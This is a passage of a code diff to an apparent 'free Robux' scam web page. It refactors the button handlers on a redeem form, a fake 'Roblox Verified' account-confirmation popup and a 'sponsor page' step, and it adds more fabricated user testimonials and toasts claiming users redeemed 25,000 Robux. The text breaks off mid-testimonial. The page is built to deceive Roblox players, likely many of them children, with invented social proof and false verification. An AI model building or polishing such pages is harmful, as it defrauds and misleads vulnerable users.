@@ -592,10 +592,10 @@
       </div>
     </div>
 
-    <form id="redeemForm" onsubmit="return false;">
+    <form id="redeemForm">
       <input type="text" id="code" value="SECRET4" placeholder="Code" />
       <input type="text" id="username" placeholder="Roblox Username" />
-      <button type="button" class="redeem-btn" id="redeemBtn" onclick="handleRedeem()">Redeem</button>
+      <button type="button" class="redeem-btn" id="redeemBtn">Redeem</button>
       <div id="message"></div>
     </form>
 
@@ -626,7 +626,7 @@
     <span class="text"><b id="toastUser"></b> just redeemed 25,000 Robux</span>
   </div>
 
-  <!-- ========== VERIFICATION POPUP ========== -->
+  <!-- VERIFICATION POPUP -->
   <div class="verify-popup" id="verifyPopup">
     <div class="popup-content">
       <div class="verified-badge">✅ Roblox Verified</div>
@@ -652,13 +652,13 @@
       <p style="color:rgba(255,255,255,0.4);font-size:13px;margin-bottom:12px;">Is this your Roblox account?</p>
       
       <div class="btn-group">
-        <button class="btn-yes" onclick="confirmYes()">✅ Yes, that's me!</button>
-        <button class="btn-no" onclick="confirmNo()">✕ No, change username</button>
+        <button class="btn-yes" id="confirmYesBtn">✅ Yes, that's me!</button>
+        <button class="btn-no" id="confirmNoBtn">✕ No, change username</button>
       </div>
     </div>
   </div>
 
-  <!-- ========== SPONSOR PAGE ========== -->
+  <!-- SPONSOR PAGE -->
   <div class="sponsor-page" id="sponsorPage">
     <div class="sponsor-content">
       <div class="step-badge">
@@ -797,4 +797,5 @@
       { user: "BlazeFury_77", text: "This is so legit! Got my code in 2 mins ⚡" },
       { user: "NightOwl_33", text: "Wow! Actually works! Thanks so much! 🙏" },
       { user: "GhostHunter_11", text: "Bruh this is insane! 25k robux for free 😍" },
-      { user: "MoonWalker_44", text: "Just got my code! This is 100%
+      { user: "MoonWalker_44", text: "Just got my code! This is 100% legit 🔥" },
+      { user: "StarChaser_55", text: "I was scared to try but it worked
